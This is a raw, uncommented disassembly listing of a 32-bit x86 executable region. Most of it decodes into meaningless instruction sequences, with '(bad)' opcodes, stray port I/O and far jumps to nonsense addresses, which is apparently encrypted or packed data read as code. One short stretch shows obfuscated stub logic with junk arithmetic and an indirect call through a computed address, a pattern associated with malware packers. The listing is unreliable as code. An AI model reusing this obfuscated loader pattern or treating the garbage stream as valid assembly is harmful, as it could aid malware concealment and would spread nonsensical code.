  40ce63:	ret    0x873
  40ce66:	jb     0x40ce9c
  40ce68:	mov    BYTE PTR [edi],ch
  40ce6a:	adc    ebx,edx
  40ce6c:	pusha  
  40ce6d:	xor    BYTE PTR [ebx+0x56],0x4a
  40ce71:	iret   
  40ce72:	xchg   ecx,eax
  40ce73:	repnz dec esp
  40ce75:	sub    dl,BYTE PTR [eax+0x2aabd6c7]
  40ce7b:	pop    esp
  40ce7c:	sub    BYTE PTR [ebp-0x5a],ch
  40ce7f:	int3   
  40ce80:	ret    
  40ce81:	into   
  40ce82:	push   cs
  40ce83:	lock mov cl,0xbe
  40ce86:	pop    ebx
  40ce87:	fmul   DWORD PTR [ecx+0x71]
  40ce8a:	aas    
  40ce8b:	or     eax,0xaca58325
  40ce90:	add    eax,0x99fc95ba
  40ce95:	fwait
  40ce96:	sbb    ch,bh
  40ce98:	xor    eax,0x774cedb9
  40ce9d:	enter  0x15cc,0xfb
  40cea1:	xor    ecx,edx
  40cea3:	scas   eax,DWORD PTR es:[edi]
  40cea4:	pushf  
  40cea5:	ficom  DWORD PTR [esi+0x13]
  40cea8:	jae    0x40cee6
  40ceaa:	push   ebp
  40ceab:	in     eax,0xdd
  40cead:	repz test DWORD PTR [ecx],ebp
  40ceb0:	jb     0x40ce63
  40ceb2:	cld    
  40ceb3:	ficom  DWORD PTR ds:0x15d8714c
  40ceb9:	outs   dx,BYTE PTR ds:[esi]
  40ceba:	mov    edi,0x70970421
  40cebf:	xchg   ebp,eax
  40cec0:	enter  0xffc3,0x8e
  40cec4:	inc    esp
  40cec5:	adc    edi,DWORD PTR [ebp+esi*1+0x1599db3f]
  40cecc:	out    0x4,eax
  40cece:	jo     0x40cf47
  40ced0:	mov    ds:0xed1d8e86,al
  40ced5:	test   DWORD PTR [ebx],esp
  40ced7:	scas   eax,DWORD PTR es:[edi]
  40ced8:	fs jae 0x40cea4
  40cedb:	pop    edi
  40cedc:	scas   al,BYTE PTR es:[edi]
  40cedd:	data16 mov al,ds:0x74b3e4e7
  40cee3:	int3   
  40cee4:	xor    cl,al
  40cee6:	jb     0x40ce6f
  40cee8:	clc    
  40cee9:	fmul   DWORD PTR [edx-0x7c]
  40ceec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ceed:	sbb    BYTE PTR es:[ecx+0x38711548],ah
  40cef4:	pop    edx
  40cef5:	jbe    0x40cf1f
  40cef7:	and    BYTE PTR [ebx],bh
  40cef9:	adc    BYTE PTR [eax+0x742fd50a],dl
  40ceff:	fwait
  40cf00:	into   
  40cf01:	imul   esp,DWORD PTR [ebx+edi*4+0x62],0x9f2d4adb
  40cf09:	int3   
  40cf0a:	xor    ebp,DWORD PTR [eax-0x6787303c]
  40cf10:	lods   al,BYTE PTR ds:[esi]
  40cf11:	xchg   BYTE PTR [ebx],bh
  40cf13:	imul   ecx,DWORD PTR ds:0xb2b2507f,0x70
  40cf1a:	maxps  xmm4,XMMWORD PTR [ecx-0x7f]
  40cf1e:	(bad)  
  40cf1f:	mov    ah,0xb2
  40cf21:	adc    BYTE PTR [esi-0x65c482fb],ah
  40cf27:	or     BYTE PTR [ecx-0x70],ch
  40cf2a:	or     BYTE PTR [edx+0x3e5e20a1],bl
  40cf30:	adc    edx,DWORD PTR [eax-0x24]
  40cf33:	cmp    al,0x31
  40cf35:	jle    0x40cefb
  40cf37:	push   edx
  40cf38:	jnp    0x40cf94
  40cf3a:	fst    st(0)
  40cf3c:	mov    cl,0xc6
  40cf3e:	nop
  40cf3f:	mov    esp,0x21b828df
  40cf44:	push   0x6a
  40cf46:	sbb    DWORD PTR [edx-0x42],0xb2eaf25
  40cf4d:	in     eax,dx
  40cf4e:	mov    dh,0xb4
  40cf50:	sub    al,0x50
  40cf52:	arpl   WORD PTR [edx-0xf8c2736],dx
  40cf58:	cli    
  40cf59:	fldenv [ebp+0x1a]
  40cf5c:	adc    edi,esi
  40cf5e:	push   ss
  40cf5f:	sbb    BYTE PTR [eax],dl
  40cf61:	pop    esi
  40cf62:	sbb    eax,0xa3a9e692
  40cf67:	xchg   ebp,eax
  40cf68:	test   al,0x65
  40cf6a:	gs jnp 0x40cf8b
  40cf6d:	or     eax,DWORD PTR [ecx]
  40cf6f:	lds    ebx,FWORD PTR [bx+di+0x23d]
  40cf74:	jo     0x40cf8e
  40cf76:	mov    cs,WORD PTR [edi-0x53]
  40cf79:	jp     0x40cfed
  40cf7b:	push   0xbe0349c3
  40cf80:	test   BYTE PTR [ebx+0x1b],ch
  40cf83:	lods   eax,DWORD PTR ds:[esi]
  40cf84:	inc    ecx
  40cf85:	and    eax,DWORD PTR [esi-0x723e5f34]
  40cf8b:	popf   
  40cf8c:	sbb    cl,bl
  40cf8e:	add    ch,bl
  40cf90:	add    BYTE PTR [edi-0x6c],0x72
  40cf94:	cdq    
  40cf95:	lods   al,BYTE PTR ds:[esi]
  40cf96:	pop    esp
  40cf97:	cmp    esp,DWORD PTR [edi+0x42]
  40cf9a:	ins    BYTE PTR es:[edi],dx
  40cf9b:	lods   eax,DWORD PTR ds:[si]
  40cf9d:	add    eax,0xa7a846b0
  40cfa2:	jge    0x40d00f
  40cfa4:	xchg   BYTE PTR [edx-0x3420930],ch
  40cfaa:	pop    ss
  40cfab:	cmp    BYTE PTR [ecx-0x4ad004db],cl
  40cfb1:	inc    eax
  40cfb2:	out    0x8a,eax
  40cfb4:	push   edx
  40cfb5:	jo     0x40d006
  40cfb7:	aas    
  40cfb8:	jb     0x40cf40
  40cfba:	ja     0x40d032
  40cfbc:	pop    ss
  40cfbd:	jmp    0x3b677398
  40cfc2:	popa   
  40cfc3:	sahf   
  40cfc4:	cmp    al,0x61
  40cfc6:	jmp    0x40cfc7
  40cfc8:	nop
  40cfc9:	xor    BYTE PTR [eax],dl
  40cfcb:	sbb    eax,0x8a3cdd52
  40cfd0:	mov    al,0xa3
  40cfd2:	loop   0x40d044
  40cfd4:	lods   al,BYTE PTR ds:[esi]
  40cfd5:	ins    BYTE PTR es:[edi],dx
  40cfd6:	pop    esp
  40cfd7:	leave  
  40cfd8:	jo     0x40cf91
  40cfda:	mov    ch,0xca
  40cfdc:	xchg   ebx,eax
  40cfdd:	fldenv [ecx-0x3b]
  40cfe0:	mov    WORD PTR [esi],?
  40cfe2:	(bad)  
  40cfe3:	into   
  40cfe4:	xor    eax,0x71792d4c
  40cfe9:	adc    al,0x21
  40cfeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfec:	or     eax,0x4576f87d
  40cff1:	das    
  40cff2:	jmp    0xc192d2c1
  40cff7:	adc    DWORD PTR [eax],edi
  40cff9:	(bad)  
  40cffa:	ja     0x40cfd0
  40cffc:	jns    0x40d04e
  40cffe:	popf   
  40cfff:	aad    0xb3
  40d001:	imul   eax,DWORD PTR [esi+0x5b],0xa417c783
  40d008:	stos   DWORD PTR es:[edi],eax
  40d009:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d00a:	pop    edi
  40d00b:	jecxz  0x40d03d
  40d00d:	inc    ebp
  40d00e:	scas   al,BYTE PTR es:[edi]
  40d00f:	out    0x3e,eax
  40d011:	mov    ebx,0xa65ce30
  40d016:	ret    
  40d017:	test   DWORD PTR [ecx+0x54e7c15c],0xe05202a2
  40d021:	(bad)  [edi+0x60]
  40d024:	arpl   WORD PTR [eax-0x7a3557d7],sp
  40d02a:	out    0x1f,eax
  40d02c:	adc    dl,bl
  40d02e:	and    BYTE PTR [esi-0x31025cc],dl
  40d034:	les    ebp,FWORD PTR [esi]
  40d036:	dec    ecx
  40d037:	xchg   esi,eax
  40d038:	push   eax
  40d039:	add    eax,0xfe6d68f4
  40d03e:	xchg   BYTE PTR [edx+edi*4],bh
  40d041:	pop    esp
  40d042:	xchg   ch,dl
  40d044:	ror    BYTE PTR [ebx],cl
  40d046:	mov    ebx,0xd7a9d879
  40d04b:	jns    0x40cff2
  40d04d:	in     al,dx
  40d04e:	loope  0x40d0cc
  40d050:	jmp    0x21cb:0x85fc1b1d
  40d057:	js     0x40d03c
  40d059:	repz cld 
  40d05b:	in     al,0x6f
  40d05d:	pop    ebx
  40d05e:	lahf   
  40d05f:	xchg   ebp,eax
  40d060:	out    dx,eax
  40d061:	js     0x40d0dc
  40d063:	and    al,0x5
  40d065:	sbb    edx,DWORD PTR ds:0xd4f10332
  40d06b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d06c:	cli    
  40d06d:	pop    ebp
  40d06e:	mov    DWORD PTR ds:0xb901f347,edx
  40d074:	xor    BYTE PTR [edi+0x37],0x9a
  40d078:	xchg   edi,eax
  40d079:	lods   eax,DWORD PTR ds:[esi]
  40d07a:	les    ebx,FWORD PTR [ebx-0x7c39ab3]
  40d080:	clc    
  40d081:	repnz inc ebp
  40d083:	xor    ebx,edi
  40d085:	repz inc edi
  40d087:	in     eax,dx
  40d088:	xor    BYTE PTR [eax-0x5b],al
  40d08b:	ror    ah,1
  40d08d:	jmp    0x736c:0x7499ab59
  40d094:	pop    edi
  40d095:	adc    DWORD PTR [ebx+0x11],eax
  40d098:	pop    edi
  40d099:	(bad)  [ebp-0x54]
  40d09c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d09d:	test   BYTE PTR ds:0xa931a3b8,cl
  40d0a3:	popa   
  40d0a4:	shr    DWORD PTR [ebp+eiz*4+0x6b],cl
  40d0a8:	xor    DWORD PTR [eax+0x1],0xffffffe4
  40d0ac:	cmp    edi,DWORD PTR [edx]
  40d0ae:	sahf   
  40d0af:	leave  
  40d0b0:	push   ecx
  40d0b1:	repz sub al,0xed
  40d0b4:	cmp    eax,0xa2692397
  40d0b9:	jae    0x40d088
  40d0bb:	popf   
  40d0bc:	pop    edi
  40d0bd:	test   al,0xc7
  40d0bf:	add    al,0x63
  40d0c1:	ds pop esp
  40d0c3:	ss cmp ebx,edx
  40d0c6:	leave  
  40d0c7:	jmp    0x799b:0xb8bbac98
  40d0ce:	clc    
  40d0cf:	push   edx
  40d0d0:	jo     0x40d10c
  40d0d2:	jnp    0x40d0a5
  40d0d4:	stc    
  40d0d5:	sub    eax,0x557002dd
  40d0da:	nop
  40d0db:	mov    ds:0xbe9d8022,eax
  40d0e0:	mov    eax,ds:0x2371ec4b
  40d0e5:	sahf   
  40d0e6:	adc    eax,0x7e2d842e
  40d0eb:	call   0xe4a4a958
  40d0f0:	into   
  40d0f1:	popa   
  40d0f2:	mov    ah,0xe4
  40d0f4:	aas    
  40d0f5:	xor    edi,ebp
  40d0f7:	sahf   
  40d0f8:	push   ecx
  40d0f9:	xor    DWORD PTR [ebx],ebx
  40d0fb:	dec    eax
  40d0fc:	hlt    
  40d0fd:	loopne 0x40d0f7
  40d0ff:	imul   eax,DWORD PTR [eax+0x4c0a3397],0x2a7aa6ab
  40d109:	inc    ecx
  40d10a:	mov    bl,0xe0
  40d10c:	dec    ebp
  40d10d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d10f:	js     0x40d0fc
  40d111:	(bad)  
  40d112:	or     DWORD PTR [esi],ebp
  40d114:	cmp    esi,DWORD PTR [esi]
  40d116:	adc    al,0x85
  40d118:	int3   
  40d119:	or     DWORD PTR [ebx-0x17d27e71],ecx
  40d11f:	dec    esp
  40d120:	sbb    eax,0x2c10e25e
  40d125:	retf   0x8ea5
  40d128:	mov    ebx,0x91e15951
  40d12d:	rcl    DWORD PTR [edx+eiz*2],cl
  40d130:	test   al,0x3a
  40d132:	push   edi
  40d133:	retf   
  40d134:	pop    eax
  40d135:	jno    0x40d1a6
  40d137:	ret    
  40d138:	mov    dl,0x43
  40d13a:	cwde   
  40d13b:	rcl    ch,cl
  40d13d:	call   0x28febadb
  40d142:	sbb    al,0xcc
  40d144:	ja     0x40d149
  40d146:	sub    BYTE PTR [edi],dh
  40d148:	xor    eax,0x748a4ae7
  40d14d:	aad    0x19
  40d14f:	dec    ecx
  40d150:	sbb    al,0xce
  40d152:	xlat   BYTE PTR ds:[ebx]
  40d153:	shl    DWORD PTR [esi],1
  40d155:	scas   eax,DWORD PTR es:[edi]
  40d156:	dec    esi
  40d157:	aam    0x73
  40d159:	xor    edx,ebx
  40d15b:	pusha  
  40d15c:	cld    
  40d15d:	std    
  40d15e:	add    BYTE PTR [ebx-0x49],ch
  40d161:	rol    BYTE PTR [ebx],0xe1
  40d164:	gs in  al,dx
  40d166:	add    eax,DWORD PTR [esp+ebp*4]
  40d169:	shr    BYTE PTR [edx+0x51],cl
  40d16c:	rcr    BYTE PTR [eax+0x28c27da0],0xd6
  40d173:	retf   
  40d174:	(bad)  
  40d175:	mov    edi,0x5ccf728a
  40d17a:	sahf   
  40d17b:	call   0xfd08:0x566270fb
  40d182:	test   eax,0xa43cacce
  40d187:	jmp    0x40d1aa
  40d189:	dec    esi
  40d18a:	popf   
  40d18b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d18c:	lock loopne 0x40d12d
  40d18f:	js     0x40d138
  40d191:	push   DWORD PTR [esi]
  40d193:	mov    ebx,0x6eed875
  40d198:	cmp    dh,BYTE PTR [ebp+esi*2-0x43]
  40d19c:	cli    
  40d19d:	adc    ecx,DWORD PTR [esi]
  40d19f:	and    DWORD PTR [edx+eiz*2-0x3d],ebp
  40d1a3:	test   al,0x7f
  40d1a5:	icebp  
  40d1a6:	out    0x83,eax
  40d1a8:	in     al,dx
  40d1a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1aa:	test   ecx,ebp
  40d1ac:	sbb    al,0x9f
  40d1ae:	and    ebp,DWORD PTR [ebx+0x4e]
  40d1b1:	or     edx,DWORD PTR [eax]
  40d1b3:	xor    BYTE PTR [edx+edx*1+0x60],bl
  40d1b7:	jl     0x40d1fd
  40d1b9:	add    DWORD PTR [edi+ebx*1+0x7a83f9d0],0xba8fb93d
  40d1c4:	jp     0x40d1ec
  40d1c6:	jle    0x40d20c
  40d1c8:	jbe    0x40d1ea
  40d1ca:	in     al,0xf8
  40d1cc:	xchg   BYTE PTR [ebx],bh
  40d1ce:	xor    al,0x87
  40d1d0:	std    
  40d1d1:	popf   
  40d1d2:	loop   0x40d1a4
  40d1d4:	in     al,dx
  40d1d5:	js     0x40d1f4
  40d1d7:	popa   
  40d1d8:	cmc    
  40d1d9:	adc    al,0xf
  40d1db:	and    ebx,DWORD PTR [edi]
  40d1dd:	imul   esp,ecx,0x3eda5df
  40d1e3:	jle    0x40d25b
  40d1e5:	leave  
  40d1e6:	aam    0x14
  40d1e8:	sbb    bp,WORD PTR [ebx]
  40d1eb:	imul   edi,DWORD PTR cs:[ecx],0xd5cd586d
  40d1f2:	xor    BYTE PTR [edi-0x24d6ac85],bh
  40d1f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1f9:	push   ss
  40d1fa:	xor    al,0x47
  40d1fc:	dec    ecx
  40d1fd:	jmp    0x40d1a1
  40d1ff:	jne    0x40d1a8
  40d201:	(bad)  [edx*1+0x3bb651e6]
  40d208:	xchg   edx,eax
  40d209:	mov    bl,0x52
  40d20b:	jns    0x40d1e2
  40d20d:	out    0x32,al
  40d20f:	fmul   QWORD PTR [eax-0x3e5622eb]
  40d215:	int3   
  40d216:	push   esp
  40d217:	pop    eax
  40d218:	pop    fs
  40d21a:	push   ebx
  40d21b:	xchg   edi,eax
  40d21c:	fucomp st(4)
  40d21e:	stos   BYTE PTR es:[edi],al
  40d21f:	popa   
  40d220:	sub    ebp,DWORD PTR [ebx-0x2d]
  40d223:	pusha  
  40d224:	or     DWORD PTR [esi],edi
  40d226:	call   0xcee7:0xb70440a1
  40d22d:	outs   dx,DWORD PTR ds:[esi]
  40d22e:	xchg   ecx,eax
  40d22f:	xor    ecx,DWORD PTR [ebx*1-0x7460729c]
  40d236:	dec    ecx
  40d237:	xlat   BYTE PTR ds:[ebx]
  40d238:	rcl    DWORD PTR [eiz*1-0x3e2960e6],0xd3
  40d240:	out    0x54,al
  40d242:	in     al,dx
  40d243:	inc    edi
  40d244:	and    BYTE PTR [edi],al
  40d246:	call   0xda6ec234
  40d24b:	xor    esp,DWORD PTR [esi+edx*2]
  40d24e:	mov    eax,0x20c335e1
  40d253:	neg    BYTE PTR [esi]
  40d255:	xor    al,0x84
  40d257:	jl     0x40d229
  40d259:	fnstcw WORD PTR [edx]
  40d25b:	add    eax,0xe5e44870
  40d260:	mov    ?,edx
  40d262:	fild   DWORD PTR [edi-0x772463d0]
  40d268:	es or  eax,0xe25cfd1a
  40d26e:	hlt    
  40d26f:	nop
  40d270:	adc    BYTE PTR [esp+eax*2-0x65],bl
  40d274:	jnp    0x40d232
  40d276:	xchg   edx,eax
  40d277:	popf   
  40d278:	or     esp,DWORD PTR [ebx+eiz*1-0x8]
  40d27c:	mov    ah,0xa2
  40d27e:	scas   eax,DWORD PTR es:[edi]
  40d27f:	pushf  
  40d280:	pop    esp
  40d281:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d282:	jl     0x40d22a
  40d284:	cli    
  40d285:	jns    0x40d224
  40d287:	mov    al,0xa7
  40d289:	or     ch,BYTE PTR [ecx+0x5fadbd32]
  40d28f:	jge    0x40d2ca
  40d291:	data16 mov cl,0xaf
  40d294:	mov    dl,0x5f
  40d296:	cmp    edi,DWORD PTR [ebx]
  40d298:	mov    eax,DWORD PTR [ebp-0x1c]
  40d29b:	test   eax,eax
  40d29d:	je     0x40d339
  40d2a3:	mov    DWORD PTR [ebp-0x20],0x0
  40d2aa:	push   edx
  40d2ab:	pop    eax
  40d2ac:	push   0x5
  40d2ae:	sub    edx,eax
  40d2b0:	pop    edx
  40d2b1:	add    edx,0xa
  40d2b4:	push   edx
  40d2b5:	pop    ecx
  40d2b6:	push   0xa
  40d2b8:	dec    ecx
  40d2b9:	pop    ebx
  40d2ba:	dec    ebx
  40d2bb:	xchg   ebx,ecx
  40d2bd:	sub    ebx,ecx
  40d2bf:	xchg   ebx,ecx
  40d2c1:	dec    ecx
  40d2c2:	mov    eax,DWORD PTR [ebp-0x1c]
  40d2c5:	imul   eax,ecx
  40d2c8:	sub    esp,eax
  40d2ca:	mov    DWORD PTR [ebp-0x20],esp
  40d2cd:	mov    eax,DWORD PTR [ebp-0x4]
  40d2d0:	xor    eax,esi
  40d2d2:	add    eax,edi
  40d2d4:	jmp    0x40d312
  40d2d9:	mov    ecx,DWORD PTR [ebp-0xc]
  40d2dc:	mov    eax,DWORD PTR [ebp+0x8]
  40d2df:	mov    edx,DWORD PTR [ebp+0x14]
  40d2e2:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d2e6:	xor    ecx,esi
  40d2e8:	add    ecx,edi
  40d2ea:	xor    edx,edx
  40d2ec:	div    ecx
  40d2ee:	mov    ecx,DWORD PTR [ebp-0x4]
  40d2f1:	xor    ecx,esi
  40d2f3:	lea    eax,[ecx+eax*1+0x3272fa]
  40d2fa:	mov    ecx,DWORD PTR [ebp+0x8]
  40d2fd:	mov    edx,DWORD PTR [ebp-0x20]
  40d300:	mov    DWORD PTR [edx+ecx*4],eax
  40d303:	mov    eax,DWORD PTR [ebp-0xc]
  40d306:	mov    ecx,DWORD PTR [ebp+0x8]
  40d309:	xor    eax,esi
  40d30b:	lea    eax,[eax+ecx*1+0x3272fa]
  40d312:	mov    DWORD PTR [ebp+0x8],eax
  40d315:	mov    eax,DWORD PTR [ebp-0xc]
  40d318:	mov    ecx,DWORD PTR [ebp+0x14]
  40d31b:	xor    eax,esi
  40d31d:	add    eax,edi
  40d31f:	imul   eax,DWORD PTR [ecx]
  40d322:	mov    ecx,DWORD PTR [ebp-0x4]
  40d325:	mov    edx,DWORD PTR [ebp+0x8]
  40d328:	xor    ecx,esi
  40d32a:	lea    ecx,[ecx+edx*1+0x3272fa]
  40d331:	cmp    ecx,eax
  40d333:	jne    0x40d2d9
  40d339:	mov    eax,DWORD PTR [ebp-0x4]
  40d33c:	xor    eax,esi
  40d33e:	add    eax,edi
  40d340:	mov    DWORD PTR [ebp-0x10],eax
  40d343:	and    ebx,0x6547647
  40d349:	xor    ebx,0x8768765
  40d34f:	xchg   ebx,esi
  40d351:	xor    ebx,ebx
  40d353:	push   esi
  40d354:	mov    esi,ebx
  40d356:	pop    ebx
  40d357:	mov    edx,esi
  40d359:	add    ebx,0x1002
  40d35f:	lea    eax,[ebp-0x18]
  40d362:	add    edx,eax
  40d364:	add    edx,0x5
  40d367:	push   edx
  40d368:	inc    esi
  40d369:	pop    ecx
  40d36a:	dec    ecx
  40d36b:	xchg   ecx,eax
  40d36c:	dec    eax
  40d36d:	xchg   ecx,eax
  40d36e:	dec    ecx
  40d36f:	xchg   ecx,edx
  40d371:	dec    edx
  40d372:	push   edx
  40d373:	mov    edx,ebx
  40d375:	pop    ebx
  40d376:	dec    ebx
  40d377:	call   DWORD PTR [ebx]
  40d379:	cmp    DWORD PTR [ebp+0x10],esi
  40d37c:	je     0x40d39d
  40d382:	xchg   edx,eax
  40d383:	push   0xc
  40d385:	pop    ecx
  40d386:	dec    ecx
  40d387:	push   0x3
  40d389:	pop    ebx
  40d38a:	inc    ebx
  40d38b:	xchg   ebx,ecx
  40d38d:	inc    ecx
  40d38e:	sub    ebx,ecx
  40d390:	xchg   ebx,ecx
  40d392:	dec    ecx
  40d393:	dec    ecx
  40d394:	mov    eax,DWORD PTR [ebp-0x1c]
  40d397:	imul   eax,ecx
  40d39a:	add    esp,eax
  40d39c:	xchg   edx,eax
  40d39d:	push   eax
  40d39e:	xor    ebx,ebx
  40d3a0:	mov    edx,esp
  40d3a2:	dec    edx
  40d3a3:	inc    ebx
  40d3a4:	add    ebx,DWORD PTR [edx+ebx*1]
  40d3a7:	dec    ebx
  40d3a8:	xor    edx,edx
  40d3aa:	add    DWORD PTR [ebp-0x10],ebx
  40d3ad:	pop    ebx
  40d3ae:	mov    eax,DWORD PTR [ebp-0x10]
  40d3b1:	pop    edi
  40d3b2:	pop    esi
  40d3b3:	pop    ebx
  40d3b4:	leave  
  40d3b5:	ret    0x10
  40d3b8:	push   ebp
  40d3b9:	mov    ebp,esp
  40d3bb:	push   ecx
  40d3bc:	or     DWORD PTR ds:0x426f29,0x4a1b
  40d3c6:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40d3cd:	movzx  edx,BYTE PTR ds:0x426f19
  40d3d4:	sub    DWORD PTR ds:0x426f21,edx
  40d3da:	mov    eax,DWORD PTR [ebp-0x4]
  40d3dd:	mov    DWORD PTR ds:0x426e91,0x1a
  40d3e7:	cmp    DWORD PTR ds:0x426e91,0x0
  40d3ee:	je     0x40d421
  40d3f4:	cmp    DWORD PTR ds:0x426e91,0x24
  40d3fb:	jl     0x40d421
  40d401:	jmp    0x40d40f
  40d406:	push   DWORD PTR [ebp-0xc]
  40d409:	call   DWORD PTR ds:0x430a2c
  40d40f:	mov    edx,DWORD PTR ds:0x426e91
  40d415:	dec    edx
  40d416:	mov    DWORD PTR ds:0x426e91,edx
  40d41c:	jmp    0x40d3e7
  40d421:	mov    edx,DWORD PTR [ebp+0x10]
  40d424:	xor    ecx,0x6edc
  40d42a:	jmp    0x40f7c6
  40d42f:	mov    ah,0x4a
  40d431:	hlt    
  40d432:	mov    ebx,0x74b46574
  40d437:	ja     0x40d48b
  40d439:	out    dx,al
  40d43a:	je     0x40d3e9
  40d43c:	and    BYTE PTR [edi],ch
  40d43e:	clc    
  40d43f:	sbb    ch,BYTE PTR [edx]
  40d441:	jnp    0x40d4be
  40d443:	clc    
  40d444:	pushf  
  40d445:	jnp    0x40d4c2
  40d447:	adc    ah,BYTE PTR [ecx+0x72527ec4]
  40d44d:	cmc    
  40d44e:	retf   
  40d44f:	inc    edi
  40d450:	mov    ebx,DWORD PTR [edx+edi*2-0x7586bc4f]
  40d457:	or     BYTE PTR [ecx],al
  40d459:	jmp    0x64259abf
  40d45e:	xlat   BYTE PTR ds:[ebx]
  40d45f:	and    al,0xd4
  40d461:	xor    al,ah
  40d463:	add    BYTE PTR [ecx-0x7faed38b],ah
  40d469:	ja     0x40d4c4
  40d46b:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40d46d:	mov    bh,0x57
  40d46f:	inc    edi
  40d470:	push   ecx
  40d471:	lock pushf 
  40d473:	mov    ch,0x49
  40d475:	ss mov ch,bh
  40d478:	dec    edx
  40d479:	pop    edi
  40d47a:	mov    DWORD PTR [edi+0x1d],esp
  40d47d:	stc    
  40d47e:	mov    al,0xad
  40d480:	loop   0x40d4ce
  40d482:	xchg   ebp,eax
  40d483:	(bad)  
  40d484:	aad    0xb7
  40d486:	push   ss
  40d487:	inc    esi
  40d488:	sbb    edx,ebx
  40d48a:	push   ss
  40d48b:	cmp    al,0x24
  40d48d:	out    dx,al
  40d48e:	fs dec ebx
  40d490:	lods   eax,DWORD PTR ds:[esi]
  40d491:	dec    ecx
  40d492:	inc    eax
  40d493:	push   0x12
  40d495:	xor    ch,bl
  40d497:	jle    0x40d4e8
  40d499:	rcr    ah,cl
  40d49b:	inc    ecx
  40d49c:	repnz repnz push edx
  40d49f:	xor    DWORD PTR [edi],edx
  40d4a1:	data16 add dh,ch
  40d4a4:	sub    BYTE PTR [ebp-0x66],cl
  40d4a7:	fs js  0x40d495
  40d4aa:	loop   0x40d51b
  40d4ac:	xchg   DWORD PTR [ebx],esp
  40d4ae:	jne    0x40d4de
  40d4b0:	push   cs
  40d4b1:	add    bl,cl
  40d4b3:	aas    
  40d4b4:	rcr    BYTE PTR [ebx+0x4a06274b],cl
  40d4ba:	add    al,0x75
  40d4bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4bd:	pusha  
  40d4be:	mov    ecx,0xd9a4b8b8
  40d4c3:	jle    0x40d488
  40d4c5:	fist   DWORD PTR [ebx]
  40d4c7:	pop    ebx
  40d4c8:	xor    edi,eax
  40d4ca:	aam    0x73
  40d4cc:	xor    edx,DWORD PTR [ebx]
  40d4ce:	dec    ebx
  40d4cf:	int    0x13
  40d4d1:	cmp    eax,0xaeaa3460
  40d4d6:	sub    ecx,DWORD PTR [edx]
  40d4d8:	mov    dl,0x9e
  40d4da:	lods   eax,DWORD PTR ds:[esi]
  40d4db:	pop    esp
  40d4dc:	push   ebx
  40d4dd:	lahf   
  40d4de:	add    DWORD PTR [ebx],eax
  40d4e0:	leave  
  40d4e1:	mov    WORD PTR [esi-0x1c23cc50],fs
  40d4e7:	cmp    ah,ch
  40d4e9:	sahf   
  40d4ea:	lea    ebx,ss:[esi+0x5898cec6]
  40d4f1:	fdivr  QWORD PTR ds:[edx-0x35]
  40d4f5:	popa   
  40d4f6:	push   esi
  40d4f7:	push   ebx
  40d4f8:	sahf   
  40d4f9:	lds    eax,FWORD PTR [ecx-0x520772b]
  40d4ff:	xchg   DWORD PTR [esi+0x27],ebx
  40d502:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d503:	mov    ecx,0x7bf8d048
  40d508:	mul    bh
  40d50a:	call   0xf532:0xf1f066dc
  40d511:	fiadd  DWORD PTR [ebp+0x3201fb16]
  40d517:	inc    esp
  40d518:	cwde   
  40d519:	push   esi
  40d51a:	adc    dh,dl
  40d51c:	in     al,0x79
  40d51e:	sub    ebx,ebx
  40d520:	mov    bl,0x11
  40d522:	ret    0x32bd
  40d525:	adc    eax,0x1400b07a
  40d52a:	xor    al,0x5
  40d52c:	bound  eax,QWORD PTR [edi]
  40d52e:	call   0x34d5:0x728a9fb9
  40d535:	mov    bh,0xf5
  40d537:	mov    dh,0xa2
  40d539:	inc    edi
  40d53a:	cmp    esp,esp
  40d53c:	jl     0x40d580
  40d53e:	mov    edx,0x6d95bfe6
  40d543:	scas   al,BYTE PTR es:[edi]
  40d544:	test   DWORD PTR [ecx+0x2f],edi
  40d547:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d548:	icebp  
  40d549:	push   ebp
  40d54a:	push   edi
  40d54b:	sub    eax,0xe13a01d5
  40d550:	imul   ecx,DWORD PTR [esi],0xffffffee
  40d553:	outs   dx,BYTE PTR ds:[esi]
  40d554:	and    eax,0x487e794f
  40d559:	mov    DWORD PTR [edi],edi
  40d55b:	popf   
  40d55c:	inc    ecx
  40d55d:	inc    esi
  40d55e:	or     BYTE PTR [edx-0x59acabf9],dl
  40d564:	dec    esi
  40d565:	push   edx
  40d566:	sbb    al,0x0
  40d568:	fcomp  st(2)
  40d56a:	cmp    DWORD PTR [esi],ebx
  40d56c:	push   es
  40d56d:	(bad)  
  40d56e:	cli    
  40d56f:	mov    ah,0x43
  40d571:	sbb    eax,ebx
  40d573:	inc    ecx
  40d574:	cmp    eax,0x9de1d44c
  40d579:	mov    dl,0x97
  40d57b:	out    dx,eax
  40d57c:	jge    0x40d584
  40d57e:	dec    edi
  40d57f:	xchg   esi,eax
  40d580:	jp     0x40d514
  40d582:	mov    ds:0x55a75c10,al
  40d587:	sub    BYTE PTR [eax-0x51],al
  40d58a:	jae    0x40d5d6
  40d58c:	jmp    0x12e7069b
  40d591:	sub    al,0x57
  40d593:	adc    DWORD PTR [ebx],edx
  40d595:	out    dx,al
  40d596:	je     0x40d58f
  40d598:	daa    
  40d599:	mov    esi,0xcf37fe89
  40d59e:	pop    ss
  40d59f:	clc    
  40d5a0:	add    esi,DWORD PTR [ebp-0x3d1cc638]
  40d5a6:	adc    ch,al
  40d5a8:	jge    0x40d5bf
  40d5aa:	xlat   BYTE PTR ds:[ebx]
  40d5ab:	int3   
  40d5ac:	adc    eax,0x6c53285f
  40d5b1:	dec    edi
  40d5b2:	test   ebx,0xf5b0d9d
  40d5b8:	adc    eax,0xc6fe4ac1
  40d5bd:	repnz fneni(8087 only) 
  40d5c0:	(bad)  
